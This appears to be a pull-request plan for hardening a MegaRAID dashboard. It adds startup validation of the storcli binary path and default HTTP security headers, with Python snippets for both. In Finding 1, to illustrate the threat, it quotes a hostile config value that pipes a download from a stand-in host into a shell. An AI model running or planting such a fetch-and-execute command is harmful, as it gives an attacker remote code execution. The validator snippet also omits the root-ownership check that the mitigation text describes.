# PR-070: validate storcli_path + security headers + Risk heading metadata

## Problem

Three low-severity findings from L3 audit and L2 review, grouped because they all relate to defense-in-depth or developer-process hygiene. None is exploitable in current homelab deployment, but each closes a gap.

**Finding 1 - `Settings.storcli_path` not validated:**
At Settings load time, `storcli_path` is accepted as any string. If someone modifies `/etc/megaraid-dashboard/env` to `STORCLI_PATH=/bin/sh -c 'curl evil.com | bash'`, no validation rejects this. The storcli runner does `subprocess_exec(argv[0], ...)` with `argv[0] = storcli_path`, which Linux passes literally - so `/bin/sh -c '...'` does NOT actually expand in argv[0] (subprocess_exec doesn't shell-parse, so the path would be tried verbatim and likely fail). But defense-in-depth principle says: validate at load, not rely on subprocess semantics. The env file has mode 0600, but attacker needs only one foothold (a config-write bug somewhere) to plant this.

Mitigation: validate at Settings load that `storcli_path` is (a) absolute, (b) exists, (c) executable, (d) owned by root or by a member of `wheel`/`adm`. Reject otherwise with a clear startup error.

**Finding 2 - No app-level security headers:**
The app does not emit HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, or Content-Security-Policy. The threat model says nginx handles these (see `deploy/nginx/megaraid.conf.sample` and `docs/PROXY-SETUP.md`). For the production deploy that is true. But: if the app is ever run without nginx (debugging, port-forwarding for quick check), it has zero header protection.

Mitigation: add a minimal `SecurityHeadersMiddleware` that sets:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: strict-origin-when-cross-origin`

HSTS and CSP are intentionally NOT added here because they depend on deployment context (HSTS requires HTTPS termination, CSP needs per-page tuning). Those stay nginx's responsibility.

**Finding 3 - Risk heading missing from task files (meta):**
Task files for PR-005 (auth middleware), PR-006 (DB schema for RoC column), PR-066 (storcli wrapper for consistency check) did not mention Risk heading despite touching AGENTS.md Risk-required perimeters (auth, schema, storcli wrapper). This is metadata, not code. No production impact. Including here because the fix is a one-line check in the task-file template and prevents future drift.

## Files to modify

`src/megaraid_dashboard/config.py`:
- Add `field_validator` for `storcli_path`:
```python
from pathlib import Path
from pydantic import field_validator

@field_validator("storcli_path")
@classmethod
def _validate_storcli_path(cls, value: str) -> str:
    path = Path(value)
    if not path.is_absolute():
        msg = f"STORCLI_PATH must be absolute, got: {value!r}"
        raise ValueError(msg)
    if not path.exists():
        msg = f"STORCLI_PATH does not exist: {value!r}"
        raise ValueError(msg)
    if not path.is_file():
        msg = f"STORCLI_PATH is not a regular file: {value!r}"
        raise ValueError(msg)
    if not os.access(path, os.X_OK):
        msg = f"STORCLI_PATH is not executable: {value!r}"
        raise ValueError(msg)
    return value
```

Skip the validator when running tests against fixtures (tests usually mock the runner). Approach: validator is on by default, tests that need to provide a non-existing path mark the case explicitly. Alternatively, add `model_config = ConfigDict(validate_default=False)` and call validator manually only in production code path. Decide during implementation; document the choice in PR description.

`src/megaraid_dashboard/web/security_headers.py` (new):
```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "strict-origin-when-cross-origin",
}

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response: Response = await call_next(request)
        for k, v in _HEADERS.items():
            response.headers.setdefault(k, v)
        return response
```

`src/megaraid_dashboard/app.py`:

- Add `app.add_middleware(SecurityHeadersMiddleware)` AFTER all other `add_middleware` calls (FastAPI/Starlette `add_middleware` reverses order, so the LAST add is the outermost; this puts security headers on every response).

## Implementation notes

The validator caveat: in tests, fixtures often provide mock storcli paths that don't exist on the test runner. Either:
- (a) Skip validator in tests via env var like `MEGARAID_SKIP_PATH_VALIDATION=1` (clear, explicit; but adds env var to learn).
- (b) Use `tmp_path` to create a real executable stub in tests that need a valid path (more setup, but tests reflect real validation logic).

Recommend (b): cleaner, no special env vars, tests exercise the real validator. The setup is one line: `tmp_path / "storcli64"; chmod 0o755; touch`.

Security headers caveat: `setdefault` not assignment, so endpoints that explicitly set their own header values (e.g., a future API endpoint that wants `X-Frame-Options: SAMEORIGIN` for an embed-friendly route) can override per-route. Default is restrictive.

Risk heading: not strictly required for this PR per AGENTS.md (no auth/CSRF/wrapper/schema change), but the storcli_path validator IS at the edge of "storcli wrapper" territory. Include Risk heading conservatively.
